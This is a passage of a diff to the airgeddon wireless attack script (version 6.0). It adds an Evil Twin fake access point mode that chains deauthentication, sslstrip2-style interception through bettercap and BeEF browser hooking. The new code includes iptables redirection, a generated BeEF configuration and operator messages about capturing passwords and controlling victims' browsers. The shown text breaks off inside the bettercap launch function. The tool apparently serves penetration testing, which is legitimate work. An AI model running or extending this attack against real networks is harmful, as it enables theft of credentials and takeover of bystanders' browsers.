@@ -1,6 +1,6 @@
 #!/bin/bash
 
-airgeddon_version="5.14"
+airgeddon_version="6.0"
 
 #Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
 debug_mode=0
@@ -55,14 +55,9 @@ optional_tools_names=(
 						"bully"
 						"pixiewps"
 						"unbuffer"
+						"bettercap"
+						"beef"
 					)
-
-declare -A optional_tools=()
-
-#Initialize optional_tools values
-for item in "${optional_tools_names[@]}"; do
-	optional_tools[${item}]=0
-done
 
 update_tools=("curl")
 
@@ -93,7 +88,14 @@ declare -A possible_package_names=(
 									[${optional_tools_names[15]}]="bully" #bully
 									[${optional_tools_names[16]}]="pixiewps" #pixiewps
 									[${optional_tools_names[17]}]="expect / expect-dev" #unbuffer
+									[${optional_tools_names[18]}]="bettercap" #bettercap
+									[${optional_tools_names[19]}]="beef / beef-xss" #beef
 									[${update_tools[0]}]="curl" #curl
+								)
+
+#More than one alias can be defined separated by spaces at value
+declare -A possible_alias_names=(
+									["beef"]="beef-xss"
 								)
 
 #General vars
@@ -151,8 +153,17 @@ dhcpd_file="ag.dhcpd.conf"
 internet_dns1="8.8.8.8"
 internet_dns2="8.8.4.4"
 sslstrip_port="10000"
+bettercap_proxy_port="8080"
+bettercap_dns_port="5300"
 sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
+bettercap_file="ag.bettercap.log"
+beef_port="3000"
+beef_control_panel_url="http://127.0.0.1:${beef_port}/ui/panel"
+jshookfile="hook.js"
+beef_file="ag.beef.conf"
+beef_pass="airgeddon"
+beef_db="beef.db"
 hostapd_file="ag.hostapd.conf"
 control_file="ag.control.sh"
 webserver_file="ag.lighttpd.conf"
@@ -170,6 +181,11 @@ possible_dhcp_leases_files=(
 							"/var/state/dhcp/dhcpd.leases"
 							"/var/lib/dhcpd/dhcpd.leases"
 						)
+possible_beef_known_locations=(
+								"/usr/share/beef/"
+								"/usr/share/beef-xss/"
+								"/opt/beef/"
+							)
 
 #Distros vars
 known_compatible_distros=(
@@ -204,7 +220,7 @@ declare handshake_attack_hints=(142)
 declare decrypt_hints=(171 178 179 208 244)
 declare select_interface_hints=(246)
 declare language_hints=(250)
-declare evil_twin_hints=(254 258 264 269 309 328)
+declare evil_twin_hints=(254 258 264 269 309 328 400)
 declare evil_twin_dos_hints=(267 268)
 declare wps_hints=(342 343 344 356 369 390)
 
@@ -270,14 +286,14 @@ function language_strings() {
 	under_construction["GREEK"]="υπό κατασκευή"
 	under_constructionvar="${under_construction[${language}]}"
 
-	declare -gA possible_package_names
-	possible_package_names["ENGLISH"]="Possible package name"
-	possible_package_names["SPANISH"]="Posible nombre del paquete"
-	possible_package_names["FRENCH"]="Possible nom du paquet"
-	possible_package_names["CATALAN"]="Possible nom del paquet"
-	possible_package_names["PORTUGUESE"]="Possível nome do pacote"
-	possible_package_names["RUSSIAN"]="Возможное имя пакета"
-	possible_package_names["GREEK"]="Πιθανό όνομα πακέτου"
+	declare -gA possible_package_names_text
+	possible_package_names_text["ENGLISH"]="Possible package name"
+	possible_package_names_text["SPANISH"]="Posible nombre del paquete"
+	possible_package_names_text["FRENCH"]="Possible nom du paquet"
+	possible_package_names_text["CATALAN"]="Possible nom del paquet"
+	possible_package_names_text["PORTUGUESE"]="Possível nome do pacote"
+	possible_package_names_text["RUSSIAN"]="Возможное имя пакета"
+	possible_package_names_text["GREEK"]="Πιθανό όνομα πακέτου"
 
 	declare -gA et_misc_texts
 	et_misc_texts["ENGLISH",0]="Evil Twin AP Info"
@@ -495,6 +511,14 @@ function language_strings() {
 	et_misc_texts["PORTUGUESE",26]="Erro. A senha deve ter no mínimo 8 caracteres. Redirecionando para a pagina principal"
 	et_misc_texts["RUSSIAN",26]="Ошибка. В пароле должно быть не менее 8 символов. Перенаправление на главную страницу"
 	et_misc_texts["GREEK",26]="Σφάλμα. Ο κωδικός πρόσβασης πρέπει να αποτελείται από τουλάχιστον 8 χαρακτήρες. Θα καθοδηγηθείτε στην κύρια οθόνη"
+
+	et_misc_texts["ENGLISH",27]="This attack has two parts. Watch the sniffer's screen to see if a password appears. You can also open BeEF control panel at ${white_color}${beef_control_panel_url}${pink_color} , log in (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) and try to control the clients browser"
+	et_misc_texts["SPANISH",27]="Este ataque tiene dos partes. Estate atento a la pantalla del sniffer para ver si aparece alguna contraseña. También puedes abrir el panel de control de BeEF en ${white_color}${beef_control_panel_url}${pink_color} , hacer login (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) e intentar controlar el navegador de los clientes"
+	et_misc_texts["FRENCH",27]="${pending_of_translation} Cette attaque comporte deux parties. Vérifiez pendant l'attaque dans la console du sniffeur si un mot de passe a été capturé. Vous pouvez également ouvrir le BeEF du panneau de commande dans ${white_color}${beef_control_panel_url}${pink_color} , pour vous connecter (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) et essayer de contrôler le navigateur client"
+	et_misc_texts["CATALAN",27]="${pending_of_translation} Aquest atac té dues parts. Amb aquest atac, estigues atent a la pantalla de l'sniffer per veure si apareix alguna contrasenya. També pots obrir el panell de control de BeEF en ${white_color}${beef_control_panel_url}${pink_color} , fer login (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) i intentar controlar el navegador dels clients"
+	et_misc_texts["PORTUGUESE",27]="${pending_of_translation} Este ataque tem duas partes. Com este ataque, fique atento na tela do sniffer para ver se aparece alguma senha. Você também pode abrir BeEF painel de controle no ${white_color}${beef_control_panel_url}${pink_color} , para login (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) e tentar controlar o navegador do clientes"
+	et_misc_texts["RUSSIAN",27]="${pending_of_translation} Эта атака состоит из двух частей. С этой атакой смотрите на окно сниффера, чтобы следить за появлением пароля. Также можно открывать панель управления BeEF в ${white_color}${beef_control_panel_url}${pink_color} , войдите в систему (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) и попытаться управлять браузером клиентов"
+	et_misc_texts["GREEK",27]="${pending_of_translation} Αυτή η επίθεση έχει δύο μέρη. Με αυτή την επίθεση, παρακολουθήστε την οθόνη του sniffer για να δείτε αν εχει εμφανιστεί κάποιος κωδικός πρόσβασης. Μπορείτε επίσης να ανοίξετε τον πίνακα ελέγχου του BeEF σε ${white_color}${beef_control_panel_url}${pink_color} , συνδεθείτε (user: ${white_color}beef${pink_color} / pass: ${white_color}${beef_pass}${pink_color}) και προσπαθούν να ελέγξουν το πρόγραμμα περιήγησης πελατών"
 
 	declare -A arr
 	arr["ENGLISH",0]="This interface ${interface} is already in managed mode"
@@ -2577,13 +2601,13 @@ function language_strings() {
 	arr["RUSSIAN",259]="6.  Атака Злой Двойник ТД со сниффингом"
 	arr["GREEK",259]="6.  Επίθεση Evil Twin AP με sniffing"
 
-	arr["ENGLISH",260]="9.  Return to main menu"
-	arr["SPANISH",260]="9.  Volver al menú principal"
-	arr["FRENCH",260]="9.  Retourner au menu principal"
-	arr["CATALAN",260]="9.  Tornar al menú principal"
-	arr["PORTUGUESE",260]="9.  Voltar ao menu principal"
-	arr["RUSSIAN",260]="9.  Возврат в главное меню"
-	arr["GREEK",260]="9.  Επιστροφή στο αρχικό μενού"
+	arr["ENGLISH",260]="10. Return to main menu"
+	arr["SPANISH",260]="10. Volver al menú principal"
+	arr["FRENCH",260]="10. Retourner au menu principal"
+	arr["CATALAN",260]="10. Tornar al menú principal"
+	arr["PORTUGUESE",260]="10. Voltar ao menu principal"
+	arr["RUSSIAN",260]="10. Возврат в главное меню"
+	arr["GREEK",260]="10. Επιστροφή στο αρχικό μενού"
 
 	arr["ENGLISH",261]="7.  Evil Twin AP attack with sniffing and sslstrip"
 	arr["SPANISH",261]="7.  Ataque Evil Twin AP con sniffing y sslstrip"
@@ -2601,13 +2625,13 @@ function language_strings() {
 	arr["RUSSIAN",262]="без сниффинга, перехватывающий портал"
 	arr["GREEK",262]="χωρίς sniffing, captive portal"
 
-	arr["ENGLISH",263]="8.  Evil Twin AP attack with captive portal (monitor mode needed)"
-	arr["SPANISH",263]="8.  Ataque Evil Twin AP con portal cautivo (modo monitor requerido)"
-	arr["FRENCH",263]="8.  Attaque Evil Twin avec portail captif (mode moniteur nécessaire)"
-	arr["CATALAN",263]="8.  Atac Evil Twin AP amb portal captiu (es requereix mode monitor)"
-	arr["PORTUGUESE",263]="8.  Ataque Evil Twin AP com portal cativo (modo monitor obrigatório)"
-	arr["RUSSIAN",263]="8.  Атака Злой Двойник ТД с перехватывающим порталом (необходим режим монитора)"
-	arr["GREEK",263]="8.  Επίθεση Evil Twin AP με captive portal (χρειάζεται η κατάσταση παρακολούθησης)"
+	arr["ENGLISH",263]="9.  Evil Twin AP attack with captive portal (monitor mode needed)"
+	arr["SPANISH",263]="9.  Ataque Evil Twin AP con portal cautivo (modo monitor requerido)"
+	arr["FRENCH",263]="9.  Attaque Evil Twin avec portail captif (mode moniteur nécessaire)"
+	arr["CATALAN",263]="9.  Atac Evil Twin AP amb portal captiu (es requereix mode monitor)"
+	arr["PORTUGUESE",263]="9.  Ataque Evil Twin AP com portal cativo (modo monitor obrigatório)"
+	arr["RUSSIAN",263]="9.  Атака Злой Двойник ТД с перехватывающим порталом (необходим режим монитора)"
+	arr["GREEK",263]="9.  Επίθεση Evil Twin AP με captive portal (χρειάζεται η κατάσταση παρακολούθησης)"
 
 	arr["ENGLISH",264]="The captive portal attack tries to one of the network clients provide us the password for the wifi network by entering it on our portal"
 	arr["SPANISH",264]="El ataque del portal cautivo intentará conseguir que uno de los clientes de la red nos proporcione la contraseña de la red wifi introduciéndola en nuestro portal"
@@ -3665,6 +3689,46 @@ function language_strings() {
 	arr["RUSSIAN",395]="${pending_of_translation} Пропустив интро, размер окна больше, требуется"
 	arr["GREEK",395]="${pending_of_translation} Παράκαμψη intro, το μέγεθος περισσότερα παράθυρο που απαιτούνται"
 
+	arr["ENGLISH",396]="8.  Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF"
+	arr["SPANISH",396]="8.  Ataque Evil Twin AP con sniffing y bettercap-sslstrip2/BeEF"
+	arr["FRENCH",396]="8.  Attaque Evil Twin avec capture des données et bettercap-sslstrip2/BeEF"
+	arr["CATALAN",396]="8.  Atac Evil Twin AP amb sniffing i bettercap-sslstrip2/BeEF"
+	arr["PORTUGUESE",396]="8.  Ataque Evil Twin AP com sniffing e bettercap-sslstrip2/BeEF"
+	arr["RUSSIAN",396]="8.  Атака Злой Двойник ТД со сниффингом и bettercap-sslstrip2/BeEF"
+	arr["GREEK",396]="8.  Επίθεση Evil Twin AP με sniffing και bettercap-sslstrip2/BeEF"
+
+	arr["ENGLISH",397]="Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF"
+	arr["SPANISH",397]="Ataque Evil Twin AP con sniffing y bettercap-sslstrip2/BeEF"
+	arr["FRENCH",397]="Attaque Evil Twin avec capture de données et bettercap-sslstrip2/BeEF"
+	arr["CATALAN",397]="Atac Evil Twin AP amb sniffing i bettercap-sslstrip2/BeEF"
+	arr["PORTUGUESE",397]="Ataque Evil Twin AP com sniffing e bettercap-sslstrip2/BeEF"
+	arr["RUSSIAN",397]="Атака Злой Двойник ТД со сниффингом и bettercap-sslstrip2/BeEF"
+	arr["GREEK",397]="Επίθεση Evil Twin AP με sniffing και bettercap-sslstrip2/BeEF"
+
+	arr["ENGLISH",398]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${default_bettercap_logpath}]"
+	arr["SPANISH",398]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${default_bettercap_logpath}]"
+	arr["FRENCH",398]="Entrez le chemin du fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${default_bettercap_logpath}]"
+	arr["CATALAN",398]="Escriu la ruta on desarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${default_bettercap_logpath}]"
+	arr["PORTUGUESE",398]="Digite o caminho onde armazenar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${default_bettercap_logpath}]"
+	arr["RUSSIAN",398]="Напечатайте путь до файла для сохранения или нажмите [Enter] для принятия предложения по умолчанию ${normal_color}[${default_bettercap_logpath}]"
+	arr["GREEK",398]="Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${default_bettercap_logpath}]"
+
+	arr["ENGLISH",399]="Passwords captured by sniffer. File saved at ${normal_color}[${bettercap_logpath}]"
+	arr["SPANISH",399]="El sniffer ha capturado contraseñas. Fichero salvado en ${normal_color}[${bettercap_logpath}]"
+	arr["FRENCH",399]="Des mots de passe ont été capturé et ont été enregistré dans ${normal_color}[${bettercap_logpath}]"
+	arr["CATALAN",399]="El sniffer ha capturat contrasenyes. Fitxer desat a ${normal_color}[${bettercap_logpath}]"
+	arr["PORTUGUESE",399]="O sniffer capturou senhas. I arquivo salvo no ${normal_color}[${bettercap_logpath}]"
+	arr["RUSSIAN",399]="Сниффер захватил пароли. Файл сохранён в ${normal_color}[${bettercap_logpath}]"
+	arr["GREEK",399]="Καταγράφτηκαν κωδικοί πρόσβασης από τον sniffer. Το αρχείο αποθηκεύτηκε στο ${normal_color}[${bettercap_logpath}]"
+
+	arr["ENGLISH",400]="On Evil Twin attack with BeEF integrated, in addition to obtaining keys using sniffing techniques, you can try to control the client's browser launching numerous attack vectors. The success of these will depend on many factors such as the kind of client's browser and its version"
+	arr["SPANISH",400]="En el ataque Evil Twin con BeEF integrado, además de obtener claves con sniffing, podrás intentar controlar el navegador de los clientes lanzando numerosos vectores de ataque. El éxito de estos dependerá de muchos factores como el tipo de navegador y la versión que utilice el cliente"
+	arr["FRENCH",400]="${pending_of_translation} Dans l'attaque Evil Twin avec BeEF intégré, plus obtenir les clés avec reniflant, vous pouvez essayer de contrôler le navigateur du client lançant de nombreux vecteurs d'attaque. Le succès de ces dépendent de nombreux facteurs tels que le type et version du navigateur utilisé par le client"
+	arr["CATALAN",400]="${pending_of_translation} En l'atac Evil Twin amb Beef integrat, a més d'obtenir claus amb sniffing, podràs intentar controlar el navegador dels clients llançant nombrosos vectors d'atac. L'èxit d'aquests dependrà de molts factors com el tipus de navegador i la versió que utilitzi el client"
+	arr["PORTUGUESE",400]="${pending_of_translation} No ataque Evil Twin com carne integrado, além de obter chaves com sniffing, você pode tentar controlar o navegador do cliente lançando inúmeros vetores de ataque. O sucesso destes dependerá de muitos fatores, tais como tipo de navegador e versão utilizada pelo cliente"
+	arr["RUSSIAN",400]="${pending_of_translation} На Evil Twin нападения с BeEF интегрированным, в дополнение к получению ключей с помощью нюхают методы, вы можете попытаться контролировать браузер клиента запускать многочисленные направления атак. Успех этих будет зависеть от многих факторов, таких как вид браузера клиента и его версии"
+	arr["GREEK",400]="${pending_of_translation} Σε Evil Twin επίθεση με το BeEF ολοκληρωμένο, εκτός από την απόκτηση κλειδιά με τη χρήση sniffing τεχνικές, μπορείτε να προσπαθήσουν να ελέγξουν το πρόγραμμα περιήγησης του πελάτη δρομολόγηση πολλών φορέων επίθεση. Η επιτυχία αυτών των θα εξαρτηθεί από πολλούς παράγοντες, όπως το είδος του browser του πελάτη και την έκδοσή του"
+
 	case "${3}" in
 		"yellow")
 			interrupt_checkpoint "${2}" "${3}"
@@ -4393,6 +4457,9 @@ function select_internet_interface() {
 		;;
 		"et_sniffing_sslstrip")
 			language_strings "${language}" 292 "title"
+		;;
+		"et_sniffing_sslstrip2")
+			language_strings "${language}" 397 "title"
 		;;
 		"et_captive_portal")
 			language_strings "${language}" 293 "title"
@@ -5244,6 +5311,33 @@ function initialize_menu_options_dependencies() {
 	bully_attacks_dependencies=(${optional_tools_names[15]} ${optional_tools_names[17]})
 	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]} ${optional_tools_names[17]})
 	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
+	et_sniffing_sslstrip2_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[18]} ${optional_tools_names[19]})
+}
+
+#Set possible changes for some commands that can be found in different ways depending of the O.S.
+function set_possible_aliases() {
+
+	for item in "${!possible_alias_names[@]}"; do
+		if ! hash "${item}" 2> /dev/null; then
+			arraliases=(${possible_alias_names[${item//[[:space:]]/ }]})
+			for item2 in "${arraliases[@]}"; do
+				if hash "${item2}" 2> /dev/null; then
+					optional_tools_names=(${optional_tools_names[@]/${item}/${item2}})
+					break
+				fi
+			done
+		fi
+	done
+}
+
+#Initialize optional_tools values
+function initialize_optional_tools_values() {
+
+	declare -gA optional_tools=()
+
+	for item in "${optional_tools_names[@]}"; do
+		optional_tools[${item}]=0
+	done
 }
 
 #Set some vars depending of the menu and invoke the printing of target vars
@@ -5318,6 +5412,11 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
 	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
+	if [ "${beef_found}" -eq 1 ]; then
+		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
+	fi
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
 	rm -rf -R "${tmpdir}${webdir}" > /dev/null 2>&1
@@ -5329,12 +5428,18 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
 }
 
-#Clean firewall rules and restore orginal routing state
+#Manage cleaning firewall rules and restore orginal routing state
 function clean_routing_rules() {
 
 	if [ -n "${original_routing_state}" ]; then
 		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward
 	fi
+
+	clean_iptables
+}
+
+#Clean iptables rules
+function clean_iptables() {
 
 	iptables -F
 	iptables -t nat -F
@@ -5531,6 +5636,7 @@ function evil_twin_attacks_menu() {
 	language_strings "${language}" 257 "separator"
 	language_strings "${language}" 259 et_sniffing_dependencies[@]
 	language_strings "${language}" 261 et_sniffing_sslstrip_dependencies[@]
+	language_strings "${language}" 396 et_sniffing_sslstrip2_dependencies[@]
 	language_strings "${language}" 262 "separator"
 	language_strings "${language}" 263 et_captive_portal_dependencies[@]
 	print_simple_separator
@@ -5606,6 +5712,22 @@ function evil_twin_attacks_menu() {
 			else
 				check_interface_wifi
 				if [ "$?" = "0" ]; then
+					et_mode="et_sniffing_sslstrip2"
+					et_dos_menu
+				else
+					echo
+					language_strings "${language}" 281 "yellow"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		9)
+			contains_element "${et_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				check_interface_wifi
+				if [ "$?" = "0" ]; then
 					et_mode="et_captive_portal"
 					echo
 					language_strings "${language}" 316 "yellow"
@@ -5622,7 +5744,7 @@ function evil_twin_attacks_menu() {
 				fi
 			fi
 		;;
-		9)
+		10)
 			return
 		;;
 		*)
@@ -6324,6 +6446,29 @@ function manage_ettercap_log() {
 	fi
 }
 
+#Check if the passwords were captured using bettercap and manage to save them on a file
+function manage_bettercap_log() {
+
+	bettercap_log=0
+	ask_yesno 302
+	if [ ${yesno} = "y" ]; then
+		bettercap_log=1
+		default_bettercap_logpath=$(env | grep ^HOME | awk -F = '{print $2}')
+		lastcharbettercaplogpath=${default_bettercap_logpath: -1}
+		if [ "${lastcharbettercaplogpath}" != "/" ]; then
+			bettercap_logpath="${default_bettercap_logpath}/"
+		fi
+		default_bettercaplogfilename="evil_twin_captured_passwords-bettercap-${essid}.txt"
+		rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
+		tmp_bettercaplog="${tmpdir}${bettercap_file}"
+		default_bettercap_logpath="${bettercap_logpath}${default_bettercaplogfilename}"
+		validpath=1
+		while [[ "${validpath}" != "0" ]]; do
+			read_path "bettercaplog"
+		done
+	fi
+}
+
 #Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
 function manage_captive_portal_log() {
 
@@ -6619,7 +6764,7 @@ function exec_et_sniffing_attack() {
 	set_std_internet_routing_rules
 	launch_dhcp_server
 	exec_et_deauth
-	launch_sniffing
+	launch_ettercap_sniffing
 	set_control_script
 	launch_control_window
 
@@ -6645,7 +6790,7 @@ function exec_et_sniffing_sslstrip_attack() {
 	launch_dhcp_server
 	exec_et_deauth
 	launch_sslstrip
-	launch_sniffing
+	launch_ettercap_sniffing
 	set_control_script
 	launch_control_window
 
@@ -6657,6 +6802,40 @@ function exec_et_sniffing_sslstrip_attack() {
 	restore_et_interface
 	if [ ${ettercap_log} -eq 1 ]; then
 		parse_ettercap_log
+	fi
+	clean_tmpfiles
+}
+
+#Execute Evil Twin with sniffing+bettercap-sslstrip2/beef attack
+function exec_et_sniffing_sslstrip2_attack() {
+
+	set_hostapd_config
+	launch_fake_ap
+	set_dhcp_config
+	set_std_internet_routing_rules
+	launch_dhcp_server
+	exec_et_deauth
+	prepare_beef_start
+	if [ "${beef_found}" -eq 1 ]; then
+		set_beef_config
+	else
+		beef_pass="beef"
+	fi
+	launch_beef
+	launch_bettercap_sniffing
+	set_control_script
+	launch_control_window
+
+	echo
+	language_strings "${language}" 298 "yellow"
+	language_strings "${language}" 115 "read"
+
+	kill_beef
+	kill_et_windows
+	restore_et_interface
+
+	if [ ${bettercap_log} -eq 1 ]; then
+		parse_bettercap_log
 	fi
 	clean_tmpfiles
 }
@@ -6719,7 +6898,7 @@ function launch_fake_ap() {
 		"et_onlyap")
 			hostapd_scr_window_position=${g1_topleft_window}
 		;;
-		"et_sniffing"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
 			hostapd_scr_window_position=${g3_topleft_window}
 		;;
 		"et_sniffing_sslstrip")
@@ -6819,10 +6998,7 @@ function set_std_internet_routing_rules() {
 	original_routing_state=$(cat /proc/sys/net/ipv4/ip_forward)
 	ifconfig "${interface}" ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
 
-	iptables -F
-	iptables -t nat -F
-	iptables -X
-	iptables -t nat -X
+	clean_iptables
 
 	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
 		iptables -P FORWARD ACCEPT
@@ -6843,6 +7019,11 @@ function set_std_internet_routing_rules() {
 	elif [ "${et_mode}" = "et_sniffing_sslstrip" ]; then
 		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ${sslstrip_port}
 		iptables -A INPUT -p tcp --destination-port ${sslstrip_port} -j ACCEPT
+	elif [ "${et_mode}" = "et_sniffing_sslstrip2" ]; then
+		iptables -A INPUT -p tcp --destination-port ${bettercap_proxy_port} -j ACCEPT
+		iptables -A INPUT -p udp --destination-port ${bettercap_dns_port} -j ACCEPT
+		iptables -A INPUT -i lo -j ACCEPT
+		iptables -A INPUT -p tcp --destination-port ${beef_port} -j ACCEPT
 	fi
 
 	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
@@ -6864,7 +7045,7 @@ function launch_dhcp_server() {
 		"et_onlyap")
 			dchcpd_scr_window_position=${g1_bottomleft_window}
 		;;
-		"et_sniffing"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
 			dchcpd_scr_window_position=${g3_middleleft_window}
 		;;
 		"et_sniffing_sslstrip")
@@ -6903,7 +7084,7 @@ function exec_et_deauth() {
 		"et_onlyap")
 			deauth_scr_window_position=${g1_bottomright_window}
 		;;
-		"et_sniffing"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2")
 			deauth_scr_window_position=${g3_bottomleft_window}
 		;;
 		"et_sniffing_sslstrip")
@@ -7394,6 +7575,9 @@ function set_control_script() {
 		"et_sniffing"|"et_sniffing_sslstrip")
 			local control_msg=${et_misc_texts[${language},5]}
 		;;
+		"et_sniffing_sslstrip2")
+			local control_msg=${et_misc_texts[${language},27]}
+		;;
 		"et_captive_portal")
 			local control_msg=${et_misc_texts[${language},6]}
 		;;
@@ -7519,6 +7703,9 @@ function launch_control_window() {
 			fi
 		;;
 		"et_sniffing_sslstrip")
+			control_scr_window_position=${g4_topright_window}
+		;;
+		"et_sniffing_sslstrip2")
 			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
@@ -7777,7 +7964,7 @@ function launch_sslstrip() {
 }
 
 #Launch ettercap sniffer
-function launch_sniffing() {
+function launch_ettercap_sniffing() {
 
 	recalculate_windows_sizes
 	case ${et_mode} in
@@ -7794,6 +7981,155 @@ function launch_sniffing() {
 	fi
 
 	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer" -e "${ettercap_cmd}" > /dev/null 2>&1 &
+	et_processes+=($!)
+}
+
+#Create configuration file for beef
+function set_beef_config() {
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
+
+	if [ -d "${beef_path}db" ]; then
+		beef_db="db/${beef_db}"
+	fi
+
+	{
+	echo -e "beef:"
+	echo -e "    version: 'Airgeddon integrated'"
+	echo -e "    debug: false"
+	echo -e "    client_debug: false"
+	echo -e "    crypto_default_value_length: 80"
+	echo -e "    restrictions:"
+	echo -e "        permitted_hooking_subnet: \"${et_ip_range}/24\""
+	echo -e "        permitted_ui_subnet: \"0.0.0.0/0\""
+	#TODO: This should be permitted_ui_subnet: "127.0.0.1/32" but is not possible to use it with bettercap's proxy because of a bug
+	#https://github.com/evilsocket/bettercap/issues/356
+	#https://github.com/beefproject/beef/issues/1337
+	echo -e "    http:"
+	echo -e "        debug: false"
+	echo -e "        host: \"0.0.0.0\""
+	echo -e "        port: \"${beef_port}\""
+	echo -e "        dns_host: \"localhost\""
+	echo -e "        dns_port: 53"
+	echo -e "        web_ui_basepath: \"/ui\""
+	echo -e "        hook_file: \"/${jshookfile}\""
+	echo -e "        hook_session_name: \"BEEFHOOK\""
+	echo -e "        session_cookie_name: \"BEEFSESSION\""
+	echo -e "        web_server_imitation:"
+	echo -e "            enable: true"
+	echo -e "            type: \"apache\""
+	echo -e "            hook_404: false"
+	echo -e "            hook_root: false"
+	echo -e "    database:"
+	echo -e "        driver: \"sqlite\""
+	echo -e "        db_file: \"${beef_db}\""
+	echo -e "    credentials:"
+	echo -e "        user: \"beef\""
+	echo -e "        passwd: \"${beef_pass}\""
+	echo -e "    autorun:"
+	echo -e "        enable: true"
+	echo -e "        result_poll_interval: 300"
+	echo -e "        result_poll_timeout: 5000"
+	echo -e "        continue_after_timeout: true"
+	echo -e "    dns_hostname_lookup: false"
+	echo -e "    integration:"
+	echo -e "        phishing_frenzy:"
+	echo -e "            enable: false"
+	echo -e "    extension:"
+	echo -e "        requester:"
+	echo -e "            enable: true"
+	echo -e "        proxy:"
+	echo -e "            enable: true"
+	echo -e "            key: \"beef_key.pem\""
+	echo -e "            cert: \"beef_cert.pem\""
+	echo -e "        metasploit:"
+	echo -e "            enable: false"
+	echo -e "        social_engineering:"
+	echo -e "            enable: true"
+	echo -e "        evasion:"
+	echo -e "            enable: false"
+	echo -e "        console:"
+	echo -e "            shell:"
+	echo -e "                enable: false"
+	echo -e "        ipec:"
+	echo -e "            enable: true"
+	echo -e "        dns:"
+	echo -e "            enable: false"
+	echo -e "        dns_rebinding:"
+	echo -e "            enable: false"
+	} >> "${tmpdir}${beef_file}"
+}
+
+#Kill beef process
+function kill_beef() {
+
+	killall "${optional_tools_names[19]}" > /dev/null 2>&1
+	if [ "$?" != "0" ]; then
+		beef_pid=$(ps uax | pgrep -fi "${optional_tools_names[19]}")
+		kill "${beef_pid}" &> /dev/null
+		if [ "$?" != "0" ]; then
+			beef_pid=$(ps uax | pgrep -fi "beef")
+			kill "${beef_pid}" &> /dev/null
+		fi
+	fi
+}
+
+#Prepare system to work with beef
+function prepare_beef_start() {
+
+	for item in "${possible_beef_known_locations[@]}"; do
+		if [ -f "${item}beef" ]; then
+			beef_path="${item}"
+			beef_found=1
+			break
+		fi
+	done
+}
+
+#Start beef process as a service
+function start_beef_service() {
+
+	service "${optional_tools_names[19]}" restart > /dev/null 2>&1
+	if [ "$?" != "0" ]; then
+		systemctl restart "${optional_tools_names[19]}.service" > /dev/null 2>&1
+	fi
+}
+
+#Launch beef browser exploitation framework
+function launch_beef() {
+
+	kill_beef
+
+	if [ "${beef_found}" -eq 0 ]; then
+		start_beef_service
+	fi
+
+	recalculate_windows_sizes
+	if [ "${beef_found}" -eq 1 ]; then
+		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
+		cp "${tmpdir}${beef_file}" "${beef_path}" > /dev/null 2>&1
+		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "cd ${beef_path} && ./beef -c \"${beef_file}\"" > /dev/null 2>&1 &
+	else
+		xterm -hold -bg black -fg green -geometry "${g4_middleright_window}" -T "BeEF" -e "${optional_tools_names[19]}" > /dev/null 2>&1 &
+	fi
+	et_processes+=($!)
+	sleep 2
+}
+
+#Launch bettercap sniffer
+function launch_bettercap_sniffing() {
+
+	recalculate_windows_sizes
+	sniffing_scr_window_position=${g4_bottomright_window}
+
